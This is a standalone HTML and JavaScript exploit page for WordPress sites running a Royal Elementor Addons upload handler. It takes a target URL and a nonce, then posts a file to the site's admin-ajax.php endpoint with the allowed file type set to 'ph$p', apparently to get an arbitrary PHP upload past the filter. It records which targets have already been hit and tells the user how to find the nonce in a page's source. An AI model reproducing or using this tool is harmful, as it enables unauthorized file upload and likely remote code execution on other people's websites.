<input type="text" id="url" placeholder="url" style="display: block; margin-bottom: 7px;">
<p style="margin-top: 2px; font-size: 14px;"></p>
<input type="text" id="nonce" placeholder="nonce" style="display: block; margin-top: 7px;">
<p style="margin-top: 2px; font-size: 14px;"></p>
<button type="button" id="submit">Go</button>

<form action="" method="POST" enctype="multipart/form-data" id="form" style="display: none; margin-top: 15px;">
    <p style="margin: 2px 0 5px 0;"></p>
    <input type="hidden" name="action" value="wpr_addons_upload_file">
    <input type="file" name="uploaded_file" class="uploaded_file">
    <input type="hidden" name="max_file_size" value="0">
    <input type="hidden" name="allowed_file_types" value="ph$p">
    <input type="hidden" name="triggering_event" value="click">
    <input type="hidden" name="wpr_addons_nonce" value="">
    <input type="submit" value="Submit" />
</form>


<script>
    const url = document.querySelector('#url');
    const nonce = document.querySelector('#nonce');
    const form = document.querySelector('#form');

    document.querySelector('#submit').addEventListener('click', () => {
        url.nextElementSibling.innerText = (!url.value) ? 'Url wajib diisi' : '';
        nonce.nextElementSibling.innerText = (!nonce.value) ? 'Nonce wajib diisi' : '';

        if (localStorage.getItem('urls') !== null) {
            const obj = localStorage.getItem('urls');
            const allUrls = JSON.parse(obj);

            if (allUrls.includes(url.value)) {
                url.nextElementSibling.innerText = 'You have executed this target before';
                url.nextElementSibling.style.color = 'red';
            }
        }

        if (url.value && nonce.value) {
            form.style.display = 'block';
            form.querySelector('p').innerText = `Current target: ${url.value}`;

            form.setAttribute('action', `${url.value}/wp-admin/admin-ajax.php`)
            form.querySelector('[name="wpr_addons_nonce"]').value = nonce.value;

            let urls;
            urls = (localStorage.getItem('urls') === null) ? [] : JSON.parse(localStorage.getItem('urls'));

            if (JSON.parse(localStorage.getItem('urls')).includes(url.value) == false) {
                urls.push(url.value);

                localStorage.setItem('urls', JSON.stringify(urls));
            }
        }
    });
</script>
<br><br>
To search nonce: view source and search -> var WprConfig

<!-- N4ST4R_ID -->
